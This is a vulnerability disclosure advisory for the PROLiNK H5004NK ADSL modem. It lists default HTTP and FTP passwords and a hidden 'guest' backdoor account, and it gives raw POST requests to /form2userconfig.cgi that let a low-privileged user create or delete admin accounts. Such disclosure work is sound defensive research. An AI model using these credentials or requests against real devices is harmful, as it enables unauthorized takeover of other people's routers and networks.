@@ -1,0 +1,219 @@
+# Exploit Title: [PROLiNK H5004NK ADSL Wireless Modem Multiple
+Vulnerabilities]
+# Discovered by: Karn Ganeshen
+# Reported on: [October 13, 2015]
+# Vendor Response: [No process to handle vuln reports]
+# Vendor Homepage: [
+http://www.prolink2u.com/newtemp/datacom/adsl-modem-router/381-h5004nk.html]
+# Version Affected: [Firmware version R76S Slt 4WNE1 6.1R]
+
+
+**Vulnerability Details**
+
+*1. Default, weak passwords for http and ftp services *
+
+a. *HTTP accounts*
+- admin/password
+- user/user
+- guest/XXXXairocon
+
+<chain N="USERNAME_PASSWORD">
+<V N="FLAG" V="0x0"/>
+<V N="USERNAME" V="admin"/>
+<V N="PASSWORD" V="password"/>
+<V N="BACKDOOR" V="0x0"/>
+<V N="PRIORITY" V="0x2"/>
+</chain>
+
+<chain N="USERNAME_PASSWORD">
+<V N="FLAG" V="0x0"/>
+<V N="USERNAME" V="user"/>
+<V N="PASSWORD" V="user"/>
+<V N="BACKDOOR" V="0x0"/>
+<V N="PRIORITY" V="0x0"/> </chain>
+
+<chain N="USERNAME_PASSWORD">
+<V N="FLAG" V="0x0"/>
+<V N="USERNAME" V="guest"/>
+<V N="PASSWORD" V="XXXXairocon"/>
+<V N="BACKDOOR" V="0x1"/>
+<V N="PRIORITY" V="0x1"/> </chain>
+
+*XXXX -> last four digits of MAC address *
+
+b. *FTP accounts*
+
+- admin/admin
+- useradmin/useradmin
+- user/user
+
+<chain N="FTP_SERVER">
+<V N="ENABLE" V="0x1"/>
+<V N="USERNAME" V="admin"/>
+<V N="PASSWORD" V="admin"/>
+<V N="PORT" V="0x15"/>
+<V N="USERRIGHT" V="0x3"/>
+<V N="INSTNUM" V="0x1"/> </chain>
+
+<chain N="FTP_SERVER">
+<V N="ENABLE" V="0x1"/>
+<V N="USERNAME" V="useradmin"/>
+<V N="PASSWORD" V="useradmin"/>
+<V N="PORT" V="0x15"/>
+<V N="USERRIGHT" V="0x2"/>
+<V N="INSTNUM" V="0x2"/> </chain>
+
+<chain N="FTP_SERVER">
+<V N="ENABLE" V="0x1"/>
+<V N="USERNAME" V="user"/>
+<V N="PASSWORD" V="user"/>
+<V N="PORT" V="0x15"/>
+<V N="USERRIGHT" V="0x1"/>
+<V N="INSTNUM" V="0x3"/> </chain>
+
+
+2. *Backdoor accounts*
+The device comes configured with privileged, backdoor account.
+
+For HTTP, 'guest' with attribute <V N="BACKDOOR" V="0x1"/>, is the backdoor
+account. This is seen in the config file:
+
+<chain N="USERNAME_PASSWORD">
+<V N="FLAG" V="0x0"/>
+<V N="USERNAME" V="guest"/>
+<V N="PASSWORD" V="XXXXairocon"/>
+<V N="BACKDOOR" V="0x1"/>
+<V N="PRIORITY" V="0x1"/>
+</chain>
+
+This user is not shown / visible in the user list when logged in as admin
+(privileged user).
+
+
+3. *No CSRF protection*
+There is no CSRF token set in any of the forms / pages.
+
+It is possible to silently execute HTTP requests if the user is logged in.
+
+
+4. *Weak RBAC controls *
+
+5a) *A non-admin user (user) can create and delete any other users,
+including root-privileged accounts. *
+
+There are three users:
+
+admin:password -> priv 2 is super user account with full functional access
+(admin/root)
+user:user -> priv 0 -> can access only some functions (user)
+guest:XXXXairocon -> privileged backdoor login
+
+
+*Normally: *
+
+- user can create new account with restricted user privs only.
+- user can change its password and only other non-admin users.
+- user can delete any other non-admin users.
+
+However, the application does not enforce strict rbac and it is possible
+for a non-admin user to create a new account with admin privileges.
+
+
+This is done as follows:
+
+1. Start creating a new user, and intercepting the user creation POST
+request
+2. Intercept & Change privilege parameter value from 0 (user) to 2 (admin)
+- Submit request
+3. When the new admin user is created successfully, it does not show up in
+user list
+4. Confirm via logging in as new admin, and / or configured accounts in
+configuration file (config.img)
+
+
+This is the POST request to create a new user:
+
+*Create user http request*:
+
+POST /form2userconfig.cgi HTTP/1.1
+Host: <IP>
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101
+Firefox/38.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: http://<IP>/userconfig.htm?v=
+Cookie: SessionID=
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 115
+username=test&privilege=2&newpass=test&confpass=test&adduser=Add&hiddenpass=&submit.htm%3Fuserconfig.htm=
+
+
+*Note1*: In some cases, this password change function is not accessible to
+'user' via GUI. But we can still send a POST request to create a valid, new
+higher privileged account.
+
+*Note2*: In some cases, application does not create admin priv user, in the
+first attempt. However, in the 2nd or 3rd attempt, new user is created
+without any issue.
+
+
+*Delete user http request:*
+A non-admin user can delete any configured user(s) including privileged
+users (admin).
+
+POST /form2userconfig.cgi HTTP/1.1
+Host: <ip>
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101
+Firefox/38.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: http://<IP>/userconfig.htm
+Cookie: SessionID=
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 131
+username=test&privilege=2&oldpass=&newpass=&confpass=&deluser=Delete&select=s3&hiddenpass=test&submit.htm%
+
+
+In case (non-admin) user is deleting the admin login (priv 2), action
+status can be confirmed by checking the configuration.
+In case (non-admin) user is deleting another user login (priv 0), action
+status can be confirmed by checking the user list.
+
+
+5b) *(non-admin priv) User can access unauthorized functions.*
+Normally, 'user' does not have access to all the functionality of the
+device. It has access to Status, Setup and Maintenance.
+
+However, few functions can still be accessed by calling them directly. For
+example, to access the mac filtering configuration this url can be opened
+directly:
+
+http://<IP>/fw-macfilter.htm
+
+Other functions may also be accessible in this manner.
+
+
+6. *Sensitive information not secured from low privileged users *
+
+A non-admin privileged user has access to download the configuration file
+- config.img.
+
+This file contains clear-text passwords, keys and other sensitive
+information which can be used to gain privileged access.
+
+
+7. *Sensitive information accessible in clear-text*
+
+Sensitive Information like passwords and keys are not secured properly.
+Mostly these are either shown in clear-text or cen censored *****, it is
+possible to view clear-text values by 'Inspect Element' locally or
+intercepting http requests, or sniffing.
+-- 
+Best Regards,
+Karn Ganeshen
